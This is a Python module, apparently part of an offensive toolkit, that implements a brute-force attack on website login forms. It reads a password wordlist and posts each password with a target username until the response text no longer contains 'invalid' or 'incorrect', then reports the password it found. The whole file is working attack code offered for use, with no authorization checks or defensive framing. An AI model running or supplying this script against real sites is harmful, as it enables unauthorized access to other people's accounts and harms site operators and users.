# modules/website_bruteforce.py

import requests

def brute_force_login(url, username, wordlist_path, user_field="username", pass_field="password"):
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = f.read().splitlines()

        headers = {
            "User-Agent": "Mozilla/5.0 (BruteForcer)"
        }

        for password in passwords:
            data = {
                user_field: username,
                pass_field: password
            }

            response = requests.post(url, data=data, headers=headers)

            # Check for successful login (customize this logic as needed)
            if "invalid" not in response.text.lower() and "incorrect" not in response.text.lower():
                return f"✅ Password found: {password}"

        return "❌ Password not found in the provided wordlist."

    except Exception as e:
        return f"Error: {e}"
